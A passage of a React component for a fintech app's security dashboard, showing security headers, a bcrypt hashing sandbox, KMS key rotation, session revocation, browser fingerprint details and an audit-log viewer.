                  <span className="text-halo-gold font-extrabold">Active</span>
                </div>
                <code className="text-[9px] text-halo-text-muted block leading-relaxed select-all bg-halo-card p-1 rounded">
                  default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
                </code>
              </div>

              <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-1.5">
                <div className="flex justify-between items-center text-[10px]">
                  <span className="text-halo-dark font-bold block">X-Frame-Options</span>
                  <span className="text-halo-gold font-extrabold">DENY</span>
                </div>
                <p className="text-[10px] text-halo-text-tertiary leading-snug">
                  Instructs the browser never to render HaloSave in 3rd-party frames. Disarms Clickjacking hijack vectors.
                </p>
              </div>

              <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-1.5">
                <div className="flex justify-between items-center text-[10px]">
                  <span className="text-halo-dark font-bold block">X-Content-Type-Options</span>
                  <span className="text-halo-gold font-extrabold">nosniff</span>
                </div>
                <p className="text-[10px] text-halo-text-tertiary leading-snug">
                  Locks mime-types strictly to resource declarations. Disables dangerous content-sniffing scripts.
                </p>
              </div>
            </div>
          </div>

        </div>
      )}

      {/* TAB CONTENT: Cryptographic KDF */}
      {activeSecSubTab === 'encryption' && (
        <div className="space-y-8 animate-in fade-in duration-200">
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            
            {/* Bcrypt Passphrase Sandbox */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">SLOW CRYPTOGRAPHIC PASSWORD HASHING</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">bcrypt Key Derivation Sandbox</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Bcrypt uses configurable computation work factor (rounds). Play with salt cost and verify password encryption delays.
                </p>
              </div>

              <div className="space-y-4 font-mono text-xs">
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <label className="text-[10px] text-halo-text-muted uppercase block font-bold">1. Plain passphrase input</label>
                    <input
                      type="text"
                      value={plainPassword}
                      onChange={(e)=>setPlainPassword(e.target.value)}
                      className="w-full bg-halo-cream border border-halo-border rounded-xl px-3 py-2.5 text-xs text-halo-dark"
                    />
                  </div>

                  <div className="space-y-1.5">
                    <div className="flex justify-between items-center">
                      <label className="text-[10px] text-halo-text-muted uppercase block font-bold">2. Cost rounds</label>
                      <span className="text-rose-400 font-extrabold font-mono text-[10px]">{bcryptRounds} rounds ({Math.pow(2, bcryptRounds)} salts)</span>
                    </div>
                    <select
                      value={bcryptRounds}
                      onChange={(e)=>setBcryptRounds(parseInt(e.target.value))}
                      className="w-full bg-halo-cream border border-halo-border rounded-xl px-3 py-2.5 text-xs text-halo-dark cursor-pointer"
                    >
                      <option value="6">6 Rounds (Very Fast / Unsafe)</option>
                      <option value="8">8 Rounds (Standard sandbox)</option>
                      <option value="10">10 Rounds (HaloSave default)</option>
                      <option value="12">12 Rounds (Enterprise strength)</option>
                      <option value="14">14 Rounds (Highly computation heavy)</option>
                      <option value="16">16 Rounds (Maximum brute force shield)</option>
                    </select>
                  </div>
                </div>

                <button
                  onClick={handleBcryptPassphrase}
                  disabled={bcryptHashing}
                  className="w-full py-3.5 bg-halo-cream hover:bg-halo-tertiary text-halo-dark border border-halo-border hover:border-halo-border-hover rounded-xl text-xs font-black transition-all flex items-center justify-center gap-2 shadow"
                >
                  {bcryptHashing ? (
                    <>
                      <RefreshCw className="w-4 h-4 text-rose-400 animate-spin" />
                      <span>Computing KDF Hash factor...</span>
                    </>
                  ) : (
                    <>
                      <Lock className="w-4 h-4 text-rose-400" />
                      <span>CRYPTOGRAPHIC ENCRYPT PASSPHRASE</span>
                    </>
                  )}
                </button>

                {bcryptHashOutput && (
                  <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-2">
                    <div className="flex justify-between text-[9px] text-halo-text-muted">
                      <span>COMPUTATION TIME: <span className="text-amber-400 font-black">{bcryptCalcTime}ms</span></span>
                      <span>ALGORITHM: bcrypt $2b$</span>
                    </div>
                    <code className="text-[10px] text-halo-gold block select-all break-all bg-halo-card p-2 rounded border border-halo-border leading-relaxed font-mono">
                      {bcryptHashOutput}
                    </code>
                  </div>
                )}

              </div>
            </div>

            {/* Hashing verifier */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6 flex flex-col justify-between">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">CRYPTO SIGNATURE AUDIT HANDSHAKE</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">Passphrase Hashing Verifier</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Authenticate credentials against a precompiled hash to inspect how verification processes handle bcrypt work factors.
                </p>
              </div>

              <div className="space-y-4 font-mono text-xs flex-1 flex flex-col justify-between mt-4">
                
                <div className="space-y-3">
                  <div className="space-y-1">
                    <label className="text-[10px] text-halo-text-muted uppercase block font-bold">Known Bcrypt Hash string</label>
                    <input
                      type="text"
                      placeholder="$2b$10$..."
                      value={verifyHashInput}
                      onChange={(e)=>setVerifyHashInput(e.target.value)}
                      className="w-full bg-halo-cream border border-halo-border rounded-xl px-3 py-2 text-[10px] text-halo-text-secondary select-all"
                    />
                  </div>

                  <div className="space-y-1">
                    <label className="text-[10px] text-halo-text-muted uppercase block font-bold">Verify passphrase key</label>
                    <input
                      type="password"
                      placeholder="••••••••••••"
                      value={verifyPassInput}
                      onChange={(e)=>setVerifyPassInput(e.target.value)}
                      className="w-full bg-halo-cream border border-halo-border rounded-xl px-3 py-2 text-[10px] text-halo-text-secondary"
                    />
                  </div>
                </div>

                <div className="space-y-3 pt-3">
                  <button
                    onClick={handleVerifyBcrypt}
                    className="w-full py-3 bg-halo-cream hover:bg-halo-tertiary text-halo-dark border border-halo-border hover:border-halo-border-hover rounded-xl text-xs font-black transition-all flex items-center justify-center gap-2"
                  >
                    <CheckCircle2 className="w-4 h-4 text-halo-gold" />
                    <span>VERIFY HASHPASS ALGORITHM</span>
                  </button>

                  {verifyResult !== null && (
                    <div className={`p-3.5 rounded-xl border text-center text-[11px] font-bold ${
                      verifyResult 
                        ? 'bg-halo-gold/10 border-halo-gold/20 text-emerald-300' 
                        : 'bg-rose-500/10 border-rose-500/20 text-rose-300 animate-pulse'
                    }`}>
                      {verifyResult 
                        ? '🟢 SUCCESS: Cryptographic verification matches! Hash payload matches passphrase.' 
                        : '🔴 INCORRECT: Passphrase hash verification mismatch! Access Denied.'}
                    </div>
                  )}
                </div>

              </div>
            </div>

          </div>

          {/* KMS master key cabinet */}
          <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">DATA AT REST ROTATION ENVELOPE</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">Platform KMS Envelope Encryption</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  HaloSave utilizes symmetric AES-256-GCM keys to wrap highly private database records. Key rotation policies protect historic audits.
                </p>
              </div>

              <button
                onClick={handleRotateKMSKey}
                disabled={kmsRotating}
                className="px-4 py-2.5 bg-rose-500 hover:bg-rose-400 text-halo-dark font-black rounded-xl text-xs font-mono transition-all flex items-center gap-1.5 shadow shadow-rose-500/15"
              >
                {kmsRotating ? (
                  <RefreshCw className="w-4 h-4 text-halo-dark animate-spin" />
                ) : (
                  <RefreshCw className="w-4 h-4 text-halo-dark" />
                )}
                <span>ROTATE PLATFORM MASTER KEY</span>
              </button>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 font-mono text-xs">
              
              <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-1">
                <span className="text-halo-text-muted block text-[9px] uppercase font-bold">KMS ENVELOPE STATUS</span>
                <div className="text-halo-dark font-extrabold flex items-center gap-2 text-sm">
                  <ShieldCheck className="w-4.5 h-4.5 text-halo-gold" />
                  <span>AES-256-GCM SECURED</span>
                </div>
                <span className="text-[10px] text-halo-text-muted block leading-tight pt-1">
                  Symmetric envelope key rotators. Attacker traversal block.
                </span>
              </div>

              <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-1">
                <span className="text-halo-text-muted block text-[9px] uppercase font-bold">ACTIVE KEY AGE</span>
                <div className="text-halo-dark font-extrabold flex items-center gap-2 text-sm">
                  <Activity className="w-4.5 h-4.5 text-halo-gold" />
                  <span>{kmsRotationAge} Days / 180 Max Age</span>
                </div>
                <span className="text-[10px] text-halo-text-muted block leading-tight pt-1">
                  KMS master key age. Regular 90-day compliance rotation recommended.
                </span>
              </div>

              <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-1">
                <span className="text-halo-text-muted block text-[9px] uppercase font-bold">Hardware Security Module</span>
                <div className="text-halo-dark font-extrabold flex items-center gap-2 text-sm">
                  <Cpu className="w-4.5 h-4.5 text-halo-gold animate-pulse" />
                  <span>FIPS 140-2 Level 3 compliant</span>
                </div>
                <span className="text-[10px] text-halo-text-muted block leading-tight pt-1">
                  AWS CloudHSM backing. Zero-knowledge master keys.
                </span>
              </div>

            </div>
          </div>

        </div>
      )}

      {/* TAB CONTENT: Fingerprints & Audits */}
      {activeSecSubTab === 'audit' && (
        <div className="space-y-8 animate-in fade-in duration-200">
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            
            {/* Session History & revocations */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">TENANT DEVICES TRACKER</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">Active Login Sessions</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Auditor panel displaying browsers authorized with active JWT tokens. Revoke rogue connections instantly.
                </p>
              </div>

              <div className="space-y-3">
                {sessions.length === 0 ? (
                  <p className="text-halo-text-muted text-center py-6 font-mono text-xs">No active sessions found.</p>
                ) : (
                  sessions.map((sess) => {
                    const isMob = sess.deviceType === 'mobile';
                    const isTab = sess.deviceType === 'tablet';
                    const DevIcon = isMob ? Smartphone : isTab ? Tablet : Laptop;

                    return (
                      <div key={sess.id} className="bg-halo-cream p-4 rounded-2xl border border-halo-border flex items-center justify-between font-mono text-xs hover:border-halo-border-hover transition-all">
                        <div className="flex items-center gap-3">
                          <div className="p-2.5 bg-halo-card rounded-xl border border-halo-border text-rose-400 shrink-0">
                            <DevIcon className="w-5 h-5" />
                          </div>
                          <div className="min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="font-extrabold text-halo-dark">{sess.browser} on {sess.os}</span>
                              {sess.isActiveNow && (
                                <span className="bg-halo-gold/10 text-halo-gold text-[8px] font-black border border-halo-gold/20 px-1.5 py-0.2 rounded-full animate-pulse">
                                  CURRENT DEVICE
                                </span>
                              )}
                            </div>
                            <p className="text-[10px] text-halo-text-muted mt-0.5 flex flex-wrap items-center gap-x-2">
                              <span>IP: {sess.ipAddress}</span>
                              <span>• {sess.location}</span>
                            </p>
                            <p className="text-[9px] text-halo-text-tertiary mt-0.5">Last active: {formatDateTime(sess.lastActive)}</p>
                          </div>
                        </div>

                        {!sess.isActiveNow && (
                          <button
                            onClick={async () => {
                              await revokeSession(sess.id);
                            }}
                            className="p-2 text-halo-text-muted hover:text-rose-400 hover:bg-rose-500/10 rounded-xl border border-halo-border hover:border-rose-500/20 transition-all shrink-0 ml-4"
                            title="Revoke session credentials"
                          >
                            <UserX className="w-4 h-4" />
                          </button>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </div>

            {/* Live WebAuthn Browser Fingerprinting details */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6 flex flex-col justify-between">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">CLIENT HEURISTICS AND REPUTATION</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">Real-time Browser Fingerprint</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  HaloSave compiles non-private hardware attributes to generate a secure client signature key. This protects accounts against cookies session theft hijack.
                </p>
              </div>

              {userFingerprint && (
                <div className="space-y-4 font-mono text-xs flex-1 flex flex-col justify-end mt-4">
                  
                  <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-2.5">
                    <div className="flex justify-between items-center border-b border-halo-border pb-2">
                      <span className="text-halo-text-muted text-[9px] uppercase font-bold">Client Signature ID</span>
                      <span className="text-halo-gold font-extrabold bg-halo-gold/10 px-2 py-0.5 rounded border border-halo-gold/20 text-[10px]">
                        Device Trust Rating: {userFingerprint.trustScore}%
                      </span>
                    </div>

                    <code className="text-xs text-rose-300 block select-all bg-halo-card p-2 rounded border border-halo-border truncate">
                      {userFingerprint.fingerprintId}
                    </code>

                    <div className="grid grid-cols-2 gap-x-4 gap-y-1.5 text-[10px] pt-1">
                      <div>
                        <span className="text-halo-text-muted text-[9px] uppercase block">Platform OS</span>
                        <span className="text-halo-text-secondary font-bold">{userFingerprint.osFamily}</span>
                      </div>
                      <div>
                        <span className="text-halo-text-muted text-[9px] uppercase block">Screen Resolution</span>
                        <span className="text-halo-text-secondary font-bold">{userFingerprint.screen}</span>
                      </div>
                      <div>
                        <span className="text-halo-text-muted text-[9px] uppercase block">Language Locale</span>
                        <span className="text-halo-text-secondary font-bold">{userFingerprint.language}</span>
                      </div>
                      <div>
                        <span className="text-halo-text-muted text-[9px] uppercase block">CPU Cores</span>
                        <span className="text-halo-text-secondary font-bold">{userFingerprint.cores} Threads</span>
                      </div>
                      <div className="col-span-2 border-t border-halo-border pt-2 text-[9px] leading-relaxed text-halo-text-muted">
                        <span className="font-extrabold text-halo-text-tertiary block uppercase mb-0.5">Cryptographic Canvas Fingerprint</span>
                        Canvas Hash: {userFingerprint.canvasHash} • WebGL: {userFingerprint.webglHash}
                      </div>
                    </div>
                  </div>

                  <div className="bg-halo-cream p-4 rounded-xl border border-halo-border/80 text-[10px] leading-relaxed text-halo-text-tertiary flex gap-2">
                    <Info className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                    <span>
                      If an active session bearer cookie is stolen and dispatched from a device containing a mismatching fingerprint signature signature block, HaloSave automatically challenges the request with a full WebAuthn Multi-Factor Prompt, preserving user balances.
                    </span>
                  </div>

                </div>
              )}
            </div>

          </div>

          {/* Master Auditing Logs search and filters */}
          <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">COMPLIANCE LEDGER</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">Audit Trail Search Panel</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Audit logs verified in PostgreSQL. Inspect platform config changes, confirmations, and security failures.
                </p>
              </div>

              <button
                onClick={() => {
                  showToast({ title: 'Report Exported 📊', description: 'Downloaded regulatory security compliance CSV.', type: 'success' });
                }}
                className="px-4 py-2 bg-halo-cream hover:bg-halo-secondary border border-halo-border text-halo-text-secondary hover:text-halo-dark rounded-xl text-xs font-mono transition-all flex items-center gap-1.5"
              >
                <Download className="w-4 h-4" />
                <span>Export Audit CSV</span>
              </button>
            </div>

            {/* Filters */}
            <div className="flex flex-col sm:flex-row gap-4 font-mono text-xs">
              <div className="flex-1">
                <input
                  type="text"
                  placeholder="Search audit trail by actor, description, action..."
                  className="w-full bg-halo-cream border border-halo-border focus:border-rose-500/50 rounded-xl px-4 py-3 text-xs text-halo-dark"
                  disabled
                />
              </div>
              <div className="grid grid-cols-2 sm:flex gap-2">
                <select className="bg-halo-cream border border-halo-border rounded-xl px-4 py-3 text-xs text-halo-text-secondary outline-none" disabled>
                  <option>ALL SEVERITIES</option>
                  <option>CRITICAL ONLY</option>
                  <option>WARNING ONLY</option>
                </select>
                <select className="bg-halo-cream border border-halo-border rounded-xl px-4 py-3 text-xs text-halo-text-secondary outline-none" disabled>
                  <option>LAST 24 HOURS</option>
                  <option>LAST 7 DAYS</option>
                  <option>ALL TIME</option>
                </select>
              </div>
            </div>

            {/* Audit Logs list */}
            <div className="space-y-2 max-h-[350px] overflow-y-auto font-mono text-xs pr-1">
              {auditLogs.map((log) => (
                <div
                  key={log.id}
                  className={`p-4 rounded-xl border flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                    log.severity === 'security' || log.severity === 'critical'
                      ? 'bg-rose-950/20 border-rose-500/20 text-rose-200'
                      : log.severity === 'warning'
                      ? 'bg-amber-950/20 border-amber-500/20 text-amber-200'
                      : 'bg-halo-cream/80 border-halo-border text-halo-text-secondary'
                  }`}
                >
                  <div className="space-y-0.5 min-w-0 pr-2 flex-1">
                    <div className="flex items-center gap-2">
                      <span className="font-extrabold uppercase tracking-wider">{log.action}</span>
                      <span className="text-[9px] px-1.5 py-0.2 rounded bg-halo-card text-halo-text-tertiary border border-halo-border">
                        {log.actor}
                      </span>
                    </div>
                    <p className="text-[11px] text-halo-text-tertiary leading-relaxed break-words">{log.details}</p>
                  </div>
                  <span className="text-[10px] text-halo-text-muted shrink-0 self-end sm:self-center whitespace-nowrap">
                    {formatDateTime(log.timestamp)}
                  </span>
                </div>
              ))}
            </div>

          </div>

        </div>
      )}

    </div>
  );
};
